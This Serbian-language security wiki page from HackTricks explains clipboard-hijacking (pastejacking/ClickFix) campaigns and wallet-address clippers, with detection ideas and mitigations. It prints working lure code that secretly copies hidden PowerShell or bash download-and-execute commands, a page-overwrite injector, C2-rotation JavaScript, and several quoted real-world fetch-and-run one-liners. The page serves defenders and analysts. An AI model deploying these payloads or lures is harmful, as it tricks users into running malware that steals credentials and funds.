# Napadi otmice clipboard-a (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> „Nikada ne lepite ništa što sami niste kopirali.“ – stari, ali i dalje važeći savet

## Pregled

Otmica clipboard-a – poznata i kao *pastejacking* – zloupotrebljava činjenicu da korisnici rutinski kopiraju i lepe komande, a da ih prethodno ne provere. Zlonamerna web stranica (ili bilo koji kontekst sa podrškom za JavaScript, kao što su Electron ili Desktop aplikacije) programski postavlja tekst pod kontrolom napadača u sistemski clipboard. Žrtve se podstiču, obično pažljivo kreiranim uputstvima za socijalni inženjering, da pritisnu **Win + R** (Run dijalog), **Win + X** (Quick Access / PowerShell), ili otvore terminal i *nalepi* sadržaj clipboard-a, čime se odmah izvršavaju proizvoljne komande.

Pošto se **ne preuzima nijedan fajl i ne otvara nijedan prilog**, ova tehnika zaobilazi većinu bezbednosnih kontrola za e-mail i web sadržaj koje nadziru priloge, makroe ili direktno izvršavanje komandi. Zbog toga je ovaj napad popularan u phishing kampanjama koje isporučuju commodity malware porodice kao što su NetSupport RAT, Latrodectus loader ili Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipper-i za zamenu adresa novčanika

Druga varijanta **otmice clipboard-a** uopšte ne lepi komande: čeka da žrtva kopira **adresu cryptocurrency novčanika**, a zatim je neprimetno zamenjuje adresom pod kontrolom napadača neposredno pre lepljenja. Ovo je naročito efikasno kod dugih formata adresa novčanika, jer korisnici često proveravaju samo početne/završne znakove.<sup>[[8]](#references)</sup>

Uobičajene osobine iz stvarnog sveta:
- **Thin loader + ugnježdeni payload**: vidljiva aplikacija/exe izgleda kao legitimni alat za trgovanje ili alat za ostvarivanje „profita“, dok je pravi clipper skriven dublje u bundle-u (na primer .NET loader koji pokreće ugnježdeni Rust payload).
- **Zamena zasnovana na regex-u**: malware prepoznaje stringove kao što su `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, ili čak generičke **44-znakovne stringove nalik Solana adresama**, i zamenjuje ih novčanicima napadača.
- **Rotacija novčanika u velikom obimu**: savremeni Windows uzorci mogu sadržati **hiljade** zamenskih novčanika po valuti umesto jedne statičke adrese, čime se smanjuje narušavanje reputacije novčanika nakon svake krađe.<sup>[[8]](#references)</sup>

### Tok rada Windows clipper-a

Uobičajena implementacija je skriveni prozor registrovan pomoću **`AddClipboardFormatListener`**. Pri svakom ažuriranju clipboard-a, malware obično poziva:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → pristupa trenutnim podacima clipboard-a.
- **`GetClipboardData`** → čita tekst.
- **`EmptyClipboard`** + **`SetClipboardData`** → zamenjuje string novčanika vrednošću napadača.

Minimalni hunting regex-i koji se često viđaju u clipper-ima:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Perzistencija na nivou korisnika dovoljna je za ostvarivanje uticaja. Jedan uočeni obrazac je:<sup>[[8]](#references)</sup>
- Kopiranje payload-a u **`%APPDATA%\silke\silke.exe`**
- Kreiranje **LNK-a u Startup folderu** u okviru `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideje za detekciju:
- Procesi koji neprekidno pozivaju clipboard API-je, a istovremeno upisuju podatke u `%APPDATA%` i korisnički **Startup** folder.
- Kreiranje novog LNK-a/izvršne datoteke, nakon čega slede izmene clipboard-a sa adresama wallet-a.
- Arhive ili paketi lažnog softvera koji sadrže mnogo nekorišćenih datoteka i mali launcher koji pokreće ugnježdeni binary.

### macOS uklanjanje quarantine-a putem socijalnog inženjeringa + LaunchAgent persistence

Na macOS-u, neke kampanje distribuiraju pomoćni **`unlocker.command`** i upućuju žrtvu da klikne desnim tasterom → **Open** ako Gatekeeper prijavi da je aplikacija oštećena ili potiče od neidentifikovanog developera. Skripta jednostavno uklanja quarantine i pokreće obližnji `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Ovo **nije** Gatekeeper exploit; to je **zaobilaženje karantina izvedeno socijalnim inženjeringom**, koje zloupotrebljava činjenicu da Gatekeeper odluke zavise od `com.apple.quarantine` xattr-a.<sup>[[8]](#references)</sup>

Nakon izvršavanja, clipper može da obezbedi persistence za trenutnog korisnika upisivanjem:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent sa `RunAtLoad` i `KeepAlive`

Korisni odbrambeni detalj jeste to što neki uzorci implementiraju **self-healing watchdog** koji ponovo upisuje LaunchAgent i wrapper na svakih približno 30 sekundi. Ako prvo uklonite plist **bez zaustavljanja pokrenutog procesa**, malware može odmah da ga ponovo kreira.<sup>[[8]](#references)</sup> Bezbedan redosled čišćenja:
1. Zaustavite aktivni clipper proces.
2. Unload-ujte/obrišite LaunchAgent plist.
3. Obrišite `~/launch.sh` i kopirani payload.

### Napomena o distribuciji: lažna reputacija kao pojačivač efekta

Kod ove familije, sam malware može ostati tehnički jednostavan, dok **distributivni sloj** obavlja najveći deo posla: lažni GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views i benign-looking VirusTotal comments/votes koriste se da bi binary delovao pouzdano pre izvršavanja.<sup>[[8]](#references)</sup>

## Dugmad za prinudno kopiranje i skriveni payload-i (macOS one-liners)

Neki macOS infostealers kloniraju sajtove za instalaciju (npr. Homebrew) i **prisiljavaju korisnika da koristi dugme „Copy“**, tako da korisnici ne mogu da označe samo vidljivi tekst. Clipboard unos sadrži očekivanu naredbu za instalaciju, kao i dodat payload kodiran u Base64 (npr. `...; echo <b64> | base64 -d | sh`), pa jedno lepljenje izvršava oba dela, dok UI skriva dodatnu fazu.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starije kampanje su koristile `document.execCommand('copy')`, dok se novije oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Tok ClickFix / ClearFake napada

1. Korisnik posećuje typosquatted ili kompromitovan sajt (npr. `docusign.sa[.]com`)
2. Ubačeni **ClearFake** JavaScript poziva pomoćnu funkciju `unsecuredCopyToClipboard()`, koja neprimetno čuva Base64-enkodirani PowerShell one-liner u clipboardu.
3. HTML uputstva govore žrtvi: *„Pritisnite **Win + R**, nalepite komandu i pritisnite Enter da biste rešili problem.“*
4. `powershell.exe` se izvršava i preuzima arhivu koja sadrži legitimni executable i zlonamerni DLL (klasični DLL sideloading).
5. Loader dešifruje dodatne faze, ubacuje shellcode i instalira persistence (npr. scheduled task) – što na kraju pokreće NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Primer NetSupport RAT lanca
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimni Java WebStart) pretražuje svoj direktorijum u potrazi za `msvcp140.dll`.
* Zlonamerni DLL dinamički razrešava API-je pomoću **GetProcAddress**, preuzima dva binarna fajla (`data_3.bin`, `data_4.bin`) putem **curl.exe**, dešifruje ih koristeći rolling XOR ključ `"https://google.com/"`, ubacuje finalni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Preuzima `la.txt` pomoću **curl.exe**
2. Izvršava JScript downloader unutar **cscript.exe**
3. Preuzima MSI payload → ispušta `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer putem MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Poziv **mshta** pokreće skrivenu PowerShell skriptu koja preuzima `PartyContinued.exe`, izdvaja `Boat.pst` (CAB), ponovo konstruiše `AutoIt3.exe` pomoću alata `extrac32` i konkatenacije datoteka i na kraju pokreće `.a3x` skriptu koja eksfiltrira akreditive pregledača na `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK sa rotirajućim C2 (PureHVNC)

Neke ClickFix kampanje u potpunosti preskaču preuzimanje datoteka i umesto toga žrtvama nalažu da nalepе one-liner koji preuzima i izvršava JavaScript putem WSH-a, uspostavlja perzistenciju i svakodnevno rotira C2. Primer uočenog lanca:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ključne karakteristike
- Obfuscated URL se tokom izvršavanja obrće kako bi se sprečila površna inspekcija.
- JavaScript se perzistira putem Startup LNK-a (WScript/CScript) i bira C2 na osnovu trenutnog dana – što omogućava brzu rotaciju domena.<sup>[[3]](#references)</sup>

Minimalni JS fragment koji se koristi za rotaciju C2-ova prema datumu:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Sledeća faza obično postavlja loader koji uspostavlja persistence i preuzima RAT (npr. PureHVNC), često vezujući TLS za hardkodovani sertifikat i segmentirajući saobraćaj.<sup>[[3]](#references)</sup>

Ideje za detekciju specifične za ovu varijantu
- Stablo procesa: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ili `cscript.exe`).
- Startup artefakti: LNK u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` koji poziva WScript/CScript sa JS putanjom ispod `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU i telemetrija komandne linije koja sadrži `.split('').reverse().join('')` ili `eval(a.responseText)`.
- Ponovljeno pokretanje `powershell -NoProfile -NonInteractive -Command -` sa velikim payloadima na stdin-u radi prosleđivanja dugih skripti bez dugih komandnih linija.
- Scheduled Tasks koji naknadno izvršavaju LOLBins kao što je `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` u okviru taska/putanje koja izgleda kao updater (npr., `\GoogleSystem\GoogleUpdater`).

Lov na pretnje
- C2 hostnames i URLs koji se rotiraju svakog dana, sa obrascem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korelacija događaja upisa u clipboard, nakon čega sledi lepljenje pomoću Win+R, a zatim neposredno izvršavanje `powershell.exe`.

Blue-teams mogu kombinovati telemetriju clipboard-a, kreiranja procesa i Registry-ja kako bi precizno identifikovali pastejacking zloupotrebu:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju **Win + R** komandi – tražite neuobičajene Base64 / obfuskovane unose.
* Security Event ID **4688** (Process Creation) gde je `ParentImage` == `explorer.exe`, a `NewProcessName` pripada skupu { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** za kreiranje datoteka ispod `%LocalAppData%\Microsoft\Windows\WinX\` ili u privremenim fasciklama neposredno pre sumnjivog 4688 događaja.
* EDR clipboard senzori (ako postoje) – korelišite `Clipboard Write` sa neposrednim pokretanjem novog PowerShell procesa.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Nedavne kampanje masovno proizvode lažne CDN/browser verification pages („Just a moment…“, IUAM-style) koje navode korisnike da kopiraju komande specifične za OS iz clipboard-a u native consoles. Time se izvršavanje izmešta iz browser sandbox-a i funkcioniše na Windows-u i macOS-u.<sup>[[4]](#references)</sup>

Ključne karakteristike stranica generisanih pomoću builder-a
- Detekcija OS-a putem `navigator.userAgent` radi prilagođavanja payload-a (Windows PowerShell/CMD naspram macOS Terminal-a). Opcioni decoys/no-ops za nepodržane OS-ove održavaju iluziju.
- Automatsko kopiranje u clipboard pri benignim UI radnjama (checkbox/Copy), dok vidljivi tekst može da se razlikuje od sadržaja clipboard-a.
- Blokiranje mobilnih uređaja i popover sa uputstvima korak po korak: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opciona obfuscation i single-file injector za prepisivanje DOM-a kompromitovanog sajta pomoću verification UI-ja stilizovanog uz Tailwind (nije potrebna registracija novog domena).<sup>[[4]](#references)</sup>

Primer: nepodudaranje clipboard-a + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence početnog pokretanja
- Koristite `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kako bi se izvršavanje nastavilo nakon zatvaranja terminala, čime se smanjuju vidljivi tragovi.<sup>[[4]](#references)</sup>

Preuzimanje stranice na kompromitovanim sajtovima u mestu её originalnog sadržaja
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detekcija i hunting ideje specifične za IUAM-style mamce
- Web: Stranice koje povezuju Clipboard API sa widgetima za verifikaciju; nepodudaranje između prikazanog teksta i clipboard payload-a; grananje na osnovu `navigator.userAgent`; Tailwind + zamena single-page sadržaja u sumnjivim kontekstima.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ubrzo nakon interakcije sa browserom; batch/MSI installer-i izvršeni iz `%TEMP%`.
- macOS endpoint: Terminal/iTerm pokreće `bash`/`curl`/`base64 -d` sa `nohup` u blizini browser događaja; background jobs koji opstaju nakon zatvaranja terminala.
- Korelacija `RunMRU` Win+R istorije i upisa u clipboard sa naknadnim kreiranjem console procesa.

Pogledajte takođe prateće tehnike

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Evolucije lažnog CAPTCHA / ClickFix napada iz 2026. (ClearFake, Scarlet Goldfinch)

- ClearFake nastavlja da kompromituje WordPress sajtove i ubacuje loader JavaScript koji ulančava eksterne hostove (Cloudflare Workers, GitHub/jsDelivr), pa čak i blockchain „etherhiding“ pozive (npr. POST zahteve ka Binance Smart Chain API endpointima kao što je `bsc-testnet.drpc[.]org`) radi preuzimanja aktuelne logike mamca. Nedavni overlay-i u velikoj meri koriste lažne CAPTCHA provere koje korisnicima nalažu da kopiraju/ubace one-liner (T1204.004), umesto da bilo šta preuzimaju.<sup>[[6]](#references)</sup>
- Početno izvršavanje se sve češće prepušta potpisanim script hostovima/LOLBAS alatima. Lanci iz januara 2026. zamenili su raniju upotrebu `mshta` ugrađenim `SyncAppvPublishingServer.vbs`, izvršenim putem `WScript.exe`, uz prosleđivanje argumenata sličnih PowerShell argumentima, sa aliasima/wildcards, radi preuzimanja udaljenog sadržaja:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` je potpisan i obično se koristi za App-V; u kombinaciji sa `WScript.exe` i neuobičajenim argumentima (aliasi `gal`/`gcm`, cmdlet-i sa džoker znakom, jsDelivr URL-ovi) postaje high-signal LOLBAS faza za ClearFake.<sup>[[6]](#references)</sup>
- Lažni CAPTCHA payload-i iz februara 2026. vratili su se na čiste PowerShell download cradle-ove. Dva aktivna primera:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Prvi chain je in-memory `iex(irm ...)` grabber; drugi koristi `WinHttp.WinHttpRequest.5.1`, upisuje privremeni `.ps1`, a zatim ga pokreće sa `-ep bypass` u skrivenom prozoru.<sup>[[6]](#references)</sup>

Saveti za detekciju/hunting ovih varijanti
- Procesna genealogija: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ili PowerShell cradles neposredno nakon upisivanja u clipboard ili Win+R.
- Ključne reči komandne linije: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domeni ili raw IP `iex(irm ...)` patterns.
- Network: outbound zahtevi ka CDN worker hostovima ili blockchain RPC endpointima iz script hostova/PowerShell-a neposredno nakon web browsing-a.
- Fajl/registry: kreiranje privremenog `.ps1` fajla u `%TEMP%`, uz RunMRU entries koji sadrže ove one-liners; blokirati/upozoriti na signed-script LOLBAS (`WScript`/`cscript`/`mshta`) koji se izvršavaju sa external URLs ili obfuskovanim alias stringovima.

## ClickFix tradecraft iz juna 2026: paste telemetry, lažni verification komentari i LOLBin chaining

Nedavni Red Canary telemetry pokazuje da stabilni indicator **nije jedna tačno određena komanda**, već kombinacija **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuskovanih flagova**, **remote retrieval-a** i **immediate execution-a**.<sup>[[7]](#references)</sup>

### Uočljivi operator patterns

- **Paste confirmation telemetry**: neki payloadi pozivaju `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` pre pravog stage-a. Ovo potvrđuje interakciju korisnika, uz kratak i tih prozor.
- **Lažni verification komentari**: PowerShell one-liners mogu dodati stringove kao što je `# Security check ✔️ I'm not a robot Verification ID: 138105`, tako da komanda i nakon paste-ovanja u Run / `cmd.exe` / PowerShell history i dalje izgleda povezano sa CAPTCHA-om.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` izbegava static URL u komandnoj liniji, ali i dalje obavlja in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` zloupotrebljava neobična velika i mala slova i Unicode-like characters u flagovima kako bi zaobišao brittle detections, dok i dalje podseća na `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` može sakriti keywords pomoću `^` escape-ova (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), pokrenuti nested shell minimizovan, sačuvati attacker content sa benignom ekstenzijom kao što je `.pdf`, a zatim ga izvršiti putem `mshta`.<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – onemogućiti clipboard write-access (`dom.events.asyncClipboard.clipboardItem` itd.) ili zahtevati user gesture.
2. Security awareness – naučiti korisnike da *otkucaju* osetljive komande ili da ih prvo paste-uju u text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control za blokiranje proizvoljnih one-liners.
4. Network controls – blokirati outbound zahteve ka poznatim pastejacking i malware C2 domenima.

## Related Tricks

* **Discord Invite Hijacking** često zloupotrebljava isti ClickFix pristup nakon namamljivanja korisnika na malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Sprečavanje Click-a: sprečavanje ClickFix attack vector-a](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Iza čiste zavese: od RAT-a do builder-a i coder-a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix Factory: prvo otkrivanje IUAM ClickFix generatora](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, godina Infostealer-a](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: februar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: jun 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Od zvezdica do upvote-ova: lažni reputation koji podstiče crypto clipboard hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
